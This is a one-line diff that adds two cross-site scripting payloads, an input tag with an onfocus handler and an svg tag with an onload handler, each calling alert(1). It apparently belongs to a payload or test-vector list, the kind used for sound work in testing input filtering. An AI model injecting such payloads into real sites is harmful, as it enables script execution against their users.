@@ -1,0 +1,1 @@
+<input x=javascript: autofocus onfocus=alert(1)><svg id=1 onload=alert(1)></svg>
